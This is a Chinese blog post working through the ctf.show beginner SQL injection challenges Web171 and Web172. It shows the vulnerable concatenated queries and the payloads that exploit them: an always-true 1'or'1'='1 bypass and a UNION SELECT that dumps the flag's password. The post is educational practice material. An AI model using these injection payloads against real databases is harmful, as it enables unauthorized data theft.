---
title: ctf_show刷题--Web入门SQL注入篇
abbrlink: a02bf74
date: 2022-09-24 08:57:00
cover: false
tags:
  - CTF-Web
categories:
  - CTF
  - Web安全
  - 刷题
typora-root-url: ..
---

# Web171

<img src="/images/ctf-web04/image-20220924085925927.png" alt="image-20220924085925927" style="zoom:67%;" />

上面给出了拼接后的查询语句:

```sql
select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;
```

用户输入的数据是`".$_GET['id']."`

输入 `1'or'1'='1`

那么拼接后就是

```sql
select username,password from user where username !='flag' and id = '1'or'1'='1' limit 1;
```

通过一个`'1'='1'`绕过了前面的限定条件拿到flag

需要注意的是这个的1是字符串数据,所以也得加引号

<br>

***

<br>

# Web172

相比与171, 返回时会检测`username`这一列是否有'flag'字符串

所以用之前的方法无法再输出flag

<img src="/images/ctf-web04/image-20220924092245542.png" alt="image-20220924092245542" style="zoom:67%;" />

尝试 `union`查询, 让`username`这一列不出现flag就好了

```
1'union select 1,(select password from ctfshow_user2 where username='flag') %23
```

<img src="/images/ctf-web04/image-20220924092455237.png" alt="image-20220924092455237" style="zoom:67%;" />

在密码这一列输出了flag (**%23解码后为#**)

```sql
# 上面拼接后的查询语句为:
select username,password from ctfshow_user2 where username !='flag' and id = '1'union select 1,(select password from ctfshow_user2 where username='flag') #' limit 1;
```

>**union select 1** 的含义:
>
>在union查询中, 前后查询必须列数相同, 如果不加这个1, 后面的查询只有password一行会报错
>
>因此1在这里就起到了一个占位符的作用, 充当一个单独的列和前面查询多出来的列相对应
>
>所以, 类似地:
>
>如果前面的查询是`select username,password,xxx from`这样,结果为三列的
>
>那么union select 后就要改为 `union select 1,2,....`此时就需要两个占位符
>
>当然, 这里的1,2换成别的啥也无所谓, 它只是过来充数的
>
>![image-20220924093207112](/images/ctf-web04/image-20220924093207112.png)

<br>

***

<br>

# web173



